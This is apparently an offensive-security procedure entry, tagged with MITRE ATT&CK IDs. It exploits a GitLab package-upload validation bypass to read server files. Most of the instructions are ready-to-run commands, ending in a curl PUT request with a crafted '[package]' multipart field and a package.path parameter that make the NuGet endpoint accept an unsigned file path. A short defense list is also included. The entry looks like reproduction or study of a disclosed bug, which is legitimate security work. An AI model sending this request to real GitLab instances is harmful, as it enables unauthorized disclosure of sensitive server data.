---
tags:
  - bypass
  - file-read
  - gitlab
type: procedure
tools:
  - '[[tools/sudo]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands: []
platforms:
  - Linux
  - GitLab
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Local System]]'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
id: d2bb5346-441b-4892-a246-9e9041ccd30f
created_at: '2025-12-11T03:47:39.430Z'
updated_at: '2025-12-11T03:47:39.430Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0009]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1005]]'
---
# Bypass Package Upload Validation for File Read

## Summary

This procedure exploits a validation bypass in GitLab's package upload endpoint to read arbitrary files in allowed paths by crafting special multipart fields.

## Description

The vulnerability stems from improper handling in Gitlab::Middleware::Multipart, where fields like '[package]' trick the system into accepting unsigned paths. This allows reading files in directories like /tmp, potentially disclosing sensitive data. Target environment is GitLab on Linux with API access.

## Requirements
1. Valid GitLab API token
2. Access to GitLab server for test file creation (or simulated)
3. curl for sending requests

## Defense

- Update GitLab to patched version
- Monitor API logs for unusual multipart fields
- Restrict file paths in middleware validation

## Objectives
1. Read arbitrary files in allowed directories
2. Bypass workhorse signing
3. Demonstrate information disclosure

## Instructions

### Step 1: Create Test File

**Context**: Prepare a target file on the server.

**Command** ([[commands/echo-create-test-file]]):
```bash
echo hello > /tmp/ggg
```

> Creates a file with 'hello' content in /tmp.

### Step 2: Change Ownership

**Context**: Set ownership to git user for compatibility.

**Command** ([[commands/sudo-chown-git]]):
```bash
sudo chown git:git /tmp/ggg
```

> Changes owner to git:git.

### Step 3: Send Bypass Request

**Context**: Exploit the endpoint to read the file.

**Command** ([[commands/curl-put-package-bypass]]):
```bash
curl -XPUT -v -F '[package]=@/tmp/lala.txt' "http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg"
```

> Sends PUT request with dummy file and target path, bypassing validation.

## MITRE ATT&CK Mapping

### Tactics
- [[Initial Access]]
- [[Collection]]

### Techniques
- [[Exploit Public-Facing Application]]
- [[Data from Local System]]

### Sub-Techniques
- None

## Commands Used
- [[commands/echo-create-test-file]]
- [[commands/sudo-chown-git]]
- [[commands/curl-put-package-bypass]]

## Tools Used
- #curl
- #echo
- [[tools/sudo]]

## Tags
- [[commands/curl-put-package-bypass]]
- #file-read
- #gitlab
